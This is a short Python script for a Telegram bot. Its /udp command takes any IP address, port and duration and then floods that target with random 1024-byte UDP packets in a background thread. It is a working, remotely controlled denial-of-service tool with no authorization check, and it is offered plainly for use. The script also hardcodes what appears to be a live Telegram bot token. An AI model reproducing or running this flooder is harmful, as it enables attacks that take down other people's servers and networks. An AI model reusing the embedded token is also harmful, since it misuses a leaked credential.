import socket
import threading
import random
import time
from telegram.ext import Updater, CommandHandler

# UDP Flood Function
def udp_flood(ip, port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(1024)  # 1024 bytes of random data
    timeout = time.time() + duration
    sent = 0

    print(f"🚀 UDP flood started on {ip}:{port} for {duration} seconds.")
    while time.time() < timeout:
        try:
            client.sendto(bytes_data, (ip, port))
            sent += 1
        except Exception as e:
            print(f"❌ Error: {e}")
    print(f"✅ UDP flood finished. Packets sent: {sent}")

# Telegram /udp command handler
def udp_command(update, context):
    if len(context.args) != 3:
        update.message.reply_text("❌ Usage: /udp <ip> <port> <seconds>")
        return

    ip = context.args[0]
    port = context.args[1]
    duration = context.args[2]

    # Validate input
    if not port.isdigit() or not duration.isdigit():
        update.message.reply_text("❌ Port and time must be numbers.")
        return

    port = int(port)
    duration = int(duration)

    update.message.reply_text(f"⚡ Starting UDP flood on {ip}:{port} for {duration} seconds.")

    threading.Thread(target=udp_flood, args=(ip, port, duration)).start()

# Your Telegram Bot Token
BOT_TOKEN = "7936735803:AAGBxUBAX9S3EzMNFeEgc6PsF8LyL2uQHdQ"

updater = Updater(BOT_TOKEN, use_context=True)
dp = updater.dispatcher

dp.add_handler(CommandHandler("udp", udp_command))

updater.start_polling()
updater.idle()
